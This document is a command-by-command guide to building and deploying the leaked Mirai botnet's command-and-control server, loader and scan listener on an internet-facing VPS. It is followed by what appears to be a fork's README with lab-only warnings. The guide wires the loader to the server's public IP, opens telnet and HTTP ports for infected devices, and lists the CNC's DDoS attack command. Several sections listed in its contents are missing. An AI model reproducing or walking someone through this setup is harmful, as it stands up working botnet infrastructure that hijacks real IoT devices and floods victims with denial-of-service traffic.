TABLE OF CONTENTS

    What Is This
    Prerequisites
    Setting Up Your VPS
    Installing Dependencies
    Installing Go
    Cloning Mirai Source
    Cross-Compilers
    Building Mirai
    Setting Up MySQL
    Building CNC
    Configuring Loader
    Building scanListen
    Startup Script
    Firewall
    Using The CNC
    CNC Commands
    Troubleshooting
    Warnings
    Credits



SECTION 1: WHAT IS THIS

Mirai is a botnet malware that infects IoT devices and uses them to launch DDoS attacks. This guide shows how to set up the Command & Control server.

    C&C Server = Headquarters
    Bots = Army of infected devices
    Attacks = Weapons


IMPORTANT: For EDUCATIONAL and SECURITY RESEARCH purposes ONLY.


SECTION 2: PREREQUISITES

Requirement	Minimum
VPS	Yes
OS	Debian 12 Bookworm
Root Access	Yes
RAM	2GB
Storage	20GB
Time	30-45 min


SECTION 3: SETTING UP YOUR VPS

Connect via SSH
ssh root@YOUR_VPS_IP

Update System

apt update -y && apt upgrade -y && apt autoremove -y



SECTION 4: INSTALLING DEPENDENCIES


apt install -y build-essential git sudo wget curl xz-utils pkg-config libgmp-dev linux-headers-$(uname -r) bison flex libelf-dev libncurses-dev libssl-dev libc6-dev-i386 mysql-server mysql-client libmysqlclient-dev screen



ln -sf /usr/lib/x86_64-linux-gnu/libgmp.so.10 /usr/lib/x86_64-linux-gnu/libgmp.so.3



SECTION 5: INSTALLING GO


cd /tmp
wget https://go.dev/dl/go1.15.15.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.15.15.linux-amd64.tar.gz
ln -sf /usr/local/go/bin/go /usr/local/bin/go
ln -sf /usr/local/go/bin/godoc /usr/local/bin/godoc
ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
rm -f go1.15.15.linux-amd64.tar.gz
go version



SECTION 6: CLONING MIRAI SOURCE


cd ~
git clone https://github.com/jgamblin/Mirai-Source-Code
cd Mirai-Source-Code
ls -la



SECTION 7: INSTALLING UCLIBC


apt install -y uclibc-dev libuclibc-dev



SECTION 8: CROSS-COMPILERS


mkdir -p /etc/xcompile
cd /etc/xcompile


Download compilers

wget https://toolchains.bootlin.com/downloads...-1.tar.bz2
wget https://toolchains.bootlin.com/downloads...-1.tar.bz2
wget https://toolchains.bootlin.com/downloads...-1.tar.bz2
wget https://toolchains.bootlin.com/downloads...-1.tar.bz2
wget https://toolchains.bootlin.com/downloads...-1.tar.bz2


Extract

for compiler in .tar.bz2; do tar -xjf "$compiler"; done
rm -f *.tar.bz2


Rename

mv armv4-eabi--uclibc--stable- armv4l 2>/dev/null || true
mv armv6-eabihf--uclibc--stable-* armv6l 2>/dev/null || true
mv i686--uclibc--stable-* i586 2>/dev/null || true
mv mips32--uclibc--stable-* mips 2>/dev/null || true
mv mips32el--uclibc--stable-* mipsel 2>/dev/null || true
chmod -R 755 /etc/xcompile/*



SECTION 9: ENVIRONMENT VARIABLES


export PATH=$PATH:/etc/xcompile/armv4l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/i586/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/usr/local/go/bin
export GOPATH=$HOME/go


Make permanent

cat >> ~/.bashrc << 'EOF'
export PATH=$PATH:/etc/xcompile/armv4l/bin:/etc/xcompile/armv6l/bin:/etc/xcompile/i586/bin:/etc/xcompile/mips/bin:/etc/xcompile/mipsel/bin:/usr/local/go/bin
export GOPATH=$HOME/go
EOF
source ~/.bashrc



SECTION 10: GO PACKAGES


export GO111MODULE=off
mkdir -p $GOPATH
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords



SECTION 11: PATCH BUILD SCRIPT


cd ~/Mirai-Source-Code
chmod +x build.sh
cp build.sh build.sh.backup
sed -i 's|gcc -static -static-libgcc|gcc -static -no-pie|g' build.sh
sed -i 's|-Wl,-static|-Wl,-static -no-pie|g' build.sh



SECTION 12: BUILDING MIRAI


./build.sh debug telnet


Verify

ls -la mirai/release/
ls -la mirai/cnc/
ls -la loader/



SECTION 13: SETTING UP MYSQL


systemctl start mysql
systemctl enable mysql
mysql -e "ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'mirai';"
mysql -e "FLUSH PRIVILEGES;"


Create database

mysql -uroot -pmirai << 'EOF'
CREATE DATABASE IF NOT EXISTS mirai;
CREATE USER IF NOT EXISTS 'mirai'@'localhost' IDENTIFIED BY 'mirai';
GRANT ALL PRIVILEGES ON mirai.* TO 'mirai'@'localhost';
FLUSH PRIVILEGES;
USE mirai;
CREATE TABLE IF NOT EXISTS `users` (
`id` int(10) unsigned NOT NULL AUTO_INCREMENT,
`username` varchar(32) NOT NULL,
`password` varchar(64) NOT NULL,
`auth_level` int(11) NOT NULL DEFAULT '0',
`admin` tinyint(1) NOT NULL DEFAULT '0',
PRIMARY KEY (`id`),
UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
INSERT IGNORE INTO `users` (`username`, `password`, `auth_level`, `admin`)
VALUES ('admin', 'admin', 10, 1);
EOF



SECTION 14: BUILDING CNC


cd ~/Mirai-Source-Code/mirai/cnc
sed -i 's|root:password@tcp(127.0.0.1:3306)/mirai|mirai:mirai@tcp(127.0.0.1:3306)/mirai|g' main.go
go build main.go


Systemd service

cat > /etc/systemd/system/mirai-cnc.service << 'EOF'
[Unit]
Description=Mirai CNC Server
After=mysql.service network.target
[Service]
Type=simple
User=root
WorkingDirectory=/root/Mirai-Source-Code/mirai/cnc
ExecStart=/root/Mirai-Source-Code/mirai/cnc/main
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable mirai-cnc
systemctl start mirai-cnc



SECTION 15: CONFIGURING LOADER


SERVER_IP=$(ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '127.0.0.1' | head -1)
echo "Server IP: $SERVER_IP"



cd ~/Mirai-Source-Code/dlr
sed -i "s|#define HTTP_SERVER.*|#define HTTP_SERVER utils_inet_addr(${SERVER_IP//./,})|g" main.c
make clean && make
mkdir -p ~/Mirai-Source-Code/loader/bins
cp release/dlr.* ~/Mirai-Source-Code/loader/bins/
cd ~/Mirai-Source-Code/loader
sed -i "s|#define SERVER_IP.*|#define SERVER_IP \"$SERVER_IP\"|g" src/main.c
chmod +x build.sh
./build.sh



SECTION 16: BUILDING SCANLISTEN


cd ~/Mirai-Source-Code
sed -i "s|127.0.0.1|$SERVER_IP|g" scanListen.go
go build scanListen.go



SECTION 17: STARTUP SCRIPT


cat > ~/start-mirai.sh << 'EOF'
#!/bin/bash
systemctl start mysql
systemctl start mirai-cnc
if [ -f ~/Mirai-Source-Code/loader/loader ]; then
screen -dmS loader ~/Mirai-Source-Code/loader/loader
fi
if [ -f ~/Mirai-Source-Code/scanListen ]; then
screen -dmS scanlisten ~/Mirai-Source-Code/scanListen
fi
echo "All services started"
echo "CNC: screen -r"
echo "Loader: screen -r loader"
echo "scanListen: screen -r scanlisten"
EOF
chmod +x ~/start-mirai.sh



SECTION 18: FIREWALL


apt install -y ufw
ufw allow 22/tcp
ufw allow 23/tcp
ufw allow 80/tcp
echo "y" | ufw enable



SECTION 19: USING THE CNC


./start-mirai.sh
screen -r


Login

Username: admin
Password: admin


Detach: CTRL+A then D


SECTION 20: CNC COMMANDS

Command	Description
help	Show all commands
bots	List connected bots
attack [ip] [port] [duration]	Launch attack
kill	Stop all attacks
clear	Clear screen
exit	Logout
status	Show botnet status
adduser [user] [pass]	Add user
deluser [user]	Delete user
setadmin [user]	Make user admin


SECTION 21: TROUBLESHOOTING

"cannot find -lgcc"
apt install gcc-multilib g++-multilib

"go: command not found"
export PATH=$PATH:/usr/local/go/bin && source ~/.bashrc

MySQL fails
systemctl restart mysql

CNC won't start
journalctl -u mirai-cnc -f
cd ~/Mirai-Source-Code/mirai/cnc && ./main

Permission denied
chmod +x ~/Mirai-Source-Code/build.sh ~/Mirai-Source-Code/loader/build.sh ~/start-mirai.sh







# Mirai Source Code
---

## 🔧 Requirements

Before building and running this code, ensure you have the following installed on a **Linux host**:

- `gcc` - GNU Compiler Collection
- `golang` - Go programming language
- `electric-fence` - Memory debugging library
- `mysql-server` - MySQL database server
- `mysql-client` - MySQL database client
- `build-essential` - Essential build tools
- `crossbuild-essential-armel` - Cross-compilation tools for ARM

**Additional Resources:**
- For detailed setup instructions and background information, refer to the original leak post in `ForumPost.txt` or view the formatted version at [ForumPost.md](ForumPost.md).


⚠️ **CRITICAL DISCLAIMER**  
This repository contains the leaked source code of the **Mirai botnet**, originally created to infect IoT devices and launch large-scale DDoS attacks. This code is provided **strictly for cybersecurity research, reverse engineering, malware analysis, and detection development purposes only**.

**⚠️ WARNING: Do not use this code to attack or scan any real devices or networks. Unauthorized use is illegal and violates GitHub policy.**

**🛡️ SECURITY NOTICE:** The [zip file](https://www.virustotal.com/en/file/f10667215040e87dae62dd48a5405b3b1b0fe7dbbfbf790d5300f3cd54893333/analysis/1477822491/) for this repo is being identified by some AV programs as malware. Please take caution.

---

## 📋 Table of Contents

- [About Mirai](#-about-mirai)
- [Repository Structure](#-repository-structure)
- [Requirements](#-requirements)
- [How to Use (Lab Research Only)](#️-how-to-use-for-lab-research-only)
- [Learning Use Cases](#-learning-use-cases)
- [Do NOT Use For](#-do-not-use-for)
- [References](#-references)
- [Credits](#-credits)
- [Acknowledgments](#-acknowledgments)

---

## 📌 About Mirai

Mirai is a malware botnet that infects Internet of Things (IoT) devices using default or weak login credentials. Once infected, these devices are controlled by a command-and-control (CnC) server and can be used to launch DDoS attacks.

This repo is a fork of the original leaked source code and includes components such as:
- The bot (runs on IoT devices)
- The CnC server
- The loader (infects devices)
- Scanning and deployment scripts

---

## 📁 Repository Structure

| Folder/File       | Description                                           |
|-------------------|-------------------------------------------------------|
| `mirai/`          | Core malware source code (bot + CnC server)          |
| `loader/`         | Infects vulnerable devices using telnet brute-force  |
| `dlr/`            | Possibly supports payload delivery (optional)        |
| `scripts/`        | Scripts for building and managing the malware        |
| `ForumPost.txt`   | Original forum post by author explaining Mirai       |
| `LICENSE.md`      | License as included in original leak (not official)  |
| `README.md`       | You’re reading it                                     |

---

## ⚙️ How to Use (FOR LAB RESEARCH ONLY)

> You must use **isolated VMs** or an offline network. Never run this on a real device or public network.

### 🔧 1. Prerequisites

Install on a **Linux host**:

```bash
sudo apt update
sudo apt install gcc make build-essential git crossbuild-essential-armel -y
```

## 🔨 2. Clone the Repository

```bash
git clone https://github.com/jgamblin/Mirai-Source-Code.git
cd Mirai-Source-Code
```

## 🔨 3. Build the Bot and CnC

```bash
./build.sh
```

This will:

*  Cross-compile the bot for different IoT architectures (MIPS, ARM, etc.)

*  Compile the CnC server for your local machine

You can customize the build script and source code paths if needed.

## 🧪 4. Setup a Test Lab (Recommended)

Create a virtual lab with:

*  1 Ubuntu VM for CnC and loader

*  1 or more OpenWRT/Linux VMs simulating IoT devices

Use Host-Only or Internal Networking mode to keep the lab isolated.

## 🕹 5. Running Components

*  Start the CnC server (mirai/cnc/cnc)

*  Run the loader to infect virtual IoT VMs

*  Observe communication logs, infection, and payload delivery

## ✅ Learning Use Cases

You can use this source code to:

*  Understand how botnets spread through weak credentials

*  Reverse engineer malware behavior

*  Write intrusion detection rules (YARA, Snort, Suricata)

*  Develop antivirus and botnet defenses

*  Study CnC-to-bot protocol and build simulators

## ❌ Do NOT Use For

*  Scanning or infecting real IoT devices

*  DDoS attacks

*  Deploying the bot to the public internet

Any such use is illegal and against GitHub policy. 

## 📚 References

* [Original Leak on Hackforums (2016)](https://hackforums.net/showthread.php?tid=5420472)
* [DDoS Analysis of Mirai by MalwareMustDie](https://blog.malwaremustdie.org/2016/10/mmd-0056-2016-new-mirai-elf-botnet.html)
* [US-CERT Alert TA16-288A](https://www.cisa.gov/news-events/alerts/2016/10/14/alert-ta16-288a)

## 👨‍💻 Credits

**Original Author:** [Anna-senpai](https://hackforums.net/showthread.php?tid=5420472) - Original Mirai botnet source code leak (2016)  
*Note: The original forum appears to be inactive as of now.*

## 🙏 Acknowledgments

Special thanks to [Pushpenderrathore](https://github.com/Pushpenderrathore) for the improved README structure and comprehensive documentation that makes this educational resource more accessible for cybersecurity research.

